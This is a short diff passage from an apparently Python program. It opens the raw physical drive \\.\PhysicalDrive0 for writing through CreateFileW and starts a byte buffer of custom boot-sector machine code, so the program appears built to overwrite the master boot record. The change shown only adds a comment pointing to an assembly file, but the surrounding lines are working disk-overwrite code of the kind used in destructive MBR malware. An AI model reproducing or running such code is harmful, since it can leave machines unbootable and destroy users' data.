@@ -19,6 +19,7 @@ hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FI
 					  0, 0)
 
 # now then, how do we make a bootable program? We will need to go very low level, into assembly.
+# you can go into boot.asm to veiw such
 buffer = bytes([
   # boot sector data goes here
 	0xE8, 0x15, 0x00, 0xBB, 0x27, 0x7C, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x43, 
